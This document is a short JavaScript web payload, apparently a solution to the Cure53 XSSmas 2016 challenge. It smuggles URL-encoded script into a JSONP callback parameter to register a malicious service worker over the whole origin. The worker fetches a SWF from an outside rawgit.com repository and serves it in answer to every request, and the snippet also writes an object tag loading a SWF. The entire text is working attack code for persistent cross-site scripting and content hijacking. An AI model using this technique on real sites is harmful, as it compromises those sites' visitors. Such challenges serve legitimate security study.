if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/token.jsonp?v=1&callback=fetch(%27https%3a%2f%2frawgit.com%2fKawaHttp%2ftest1%2fmaster%2fsantax.swf%27%2c+%7b+headers%3a+%7b%22Content-type%22%3a+%22application%2fx-shockwave-flash%3b+charset%3dUTF-8%22%2c%22vary%22+%3a%22Accept-Encoding%22%7d%7d).then(function(response)+%7b%0d%0a++if(response.ok)+%7b%0d%0a++++response.text().then(function(x)+%7b%0d%0a++++++resp+%3d+x%3b%0d%0a++++%7d)%3b%0d%0a++%7d+else+%7b%0d%0a++++console.log(%27Network+response+was+not+ok.%27)%3b%0d%0a++%7d%0d%0a%7d)%3b%0d%0a%0d%0athis.addEventListener(%27install%27%2c+function(event)+%7b%0d%0a++event.waitUntil(%0d%0a++++caches.open(%27v1%27).then(function(cache)+%7b%0d%0a++++++return+cache.addAll(%5b%0d%0a++++++++%27%2ftoken.xml%27%0d%0a++++++%5d)%3b%0d%0a++++%7d)%0d%0a++)%3b%0d%0a%7d)%3b%0d%0a%0d%0athis.addEventListener(%27fetch%27%2c+function(event)+%7b%0d%0a+++++event.respondWith(%0d%0a+++++++++++new+Response(resp%2c+%7b+headers%3a+%7b+%27Content-Type%27%3a+%27application%2fx-shockwave-flash%3b+charset%3dutf-8%27+%7d+%7d)%0d%0a+++++++++)%3b%0d%0a%7d)%3b%0d%0a%2f%2f', { scope: '/' }).then(function(reg) {
    
  }).catch(function(error) {
    // registration failed
    console.log('Registration failed with ' + error);
  });
};

document.write("<object><param name='movie' value='https://xssmas2016.cure53.de/swf.swf'></object>");
